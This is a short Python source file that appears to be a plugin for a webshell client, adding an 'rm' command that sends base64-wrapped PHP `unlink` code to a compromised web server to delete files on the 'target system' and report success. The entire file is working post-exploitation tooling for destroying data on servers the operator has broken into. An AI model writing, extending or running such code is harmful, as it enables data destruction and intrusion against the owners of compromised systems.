from libs.config import alias, color
from libs.myapp import send, base64_encode


def get_php(web_file_path):
    return """if(unlink(base64_decode("%s"))){echo 'success';}""" % base64_encode(web_file_path)


@alias(True, func_alias="rm", _type="FILE")
def run(*web_file_paths):
    """
    rm

    Delete target system file(s).

    eg: remove {web_file_path1} {web_file_path2} ..
    """
    for each_file_path in web_file_paths:
        php = get_php(each_file_path)
        res = send(php)
        if (not res):
            return
        text = res.r_text.strip()
        if (text == 'success'):
            print("\n" + color.green(f"Delete {each_file_path} success.") + "\n")
        else:
            print("\n" + color.red(f"Delete {each_file_path} failed.") + "\n")
